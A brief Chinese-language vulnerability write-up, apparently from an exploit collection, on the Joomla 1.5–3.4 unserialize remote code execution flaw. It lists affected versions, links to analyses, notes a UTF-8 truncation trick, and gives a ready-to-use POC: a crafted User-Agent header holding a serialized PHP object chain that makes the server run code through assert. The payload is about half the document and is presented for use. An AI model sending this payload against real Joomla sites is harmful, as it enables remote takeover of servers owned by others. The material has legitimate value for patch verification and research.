# Joomla远程代码执行漏洞
## 影响范围
* `Joomla 1.5 to 3.4 all version`
## 分析
* [https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html](https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html)
* PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患[https://github.com/80vul/phpcodz/blob/master/research/pch-013.md](https://github.com/80vul/phpcodz/blob/master/research/pch-013.md)
* `利用'𝌆'(%F0%9D%8C%86)字符将utf-8的字段截断.`
## POC
```
User-Agent: 123}__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:37:"ρhιτhσπpinfo();JFactory::getConfig();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}ð
```
